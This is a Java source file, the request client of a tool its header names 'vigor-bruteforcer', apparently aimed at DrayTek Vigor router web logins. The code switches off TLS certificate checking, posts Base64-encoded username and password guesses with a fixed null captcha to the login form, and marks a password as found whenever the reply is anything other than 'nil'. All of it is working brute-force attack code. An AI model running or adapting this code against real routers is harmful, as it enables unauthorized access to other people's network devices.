import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Observable;

/**
 * 25-11-17
 * vigor-bruteforcer created by Dane Naebers
 */
public class RequestClient extends Observable {
    private URL url;
    private HttpURLConnection con;
    public  Map<String, Result> result;

    public RequestClient(String reqUrl) throws IOException {
        configureRequestClient(reqUrl);
    }

    private void configureRequestClient(String reqUrl) throws IOException {
        HttpsTrustManager.allowAllSSL();
        url = new URL(reqUrl);
        con = (HttpURLConnection) url.openConnection();
        con.setRequestProperty("Content-Type", "text/plain; charset=utf-8");
        con.setRequestMethod("POST");
        con.setDoOutput(true);
        con.setDoInput(true);
        result = new HashMap<>();
    }

    private String encodeParam(String param) {
        return Base64.getEncoder().encodeToString(param.getBytes());
    }

    public void makeRequest(String username, String password) throws IOException {
        OutputStream os = con.getOutputStream();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("action=login&formusername=");
        stringBuilder.append(encodeParam(username));
        stringBuilder.append("&formpassword=");
        stringBuilder.append(encodeParam(password));
        stringBuilder.append("&formcaptcha=bnVsbA==&rtick=null");
        os.write(stringBuilder.toString().getBytes("UTF-8"));
        os.close();

        StringBuilder response = new StringBuilder();
        BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "utf-8"));
        String line;
        while ((line = br.readLine()) != null) {
            response.append(line);
        }
        br.close();
        if(!response.toString().toLowerCase().equals("nil")) {
            result.put(password, Result.TRUE);
            this.setChanged();
            this.notifyObservers(result);
        } else {
            result.put(password, Result.FALSE);
            this.setChanged();
            this.notifyObservers(result);
        }
    }

}
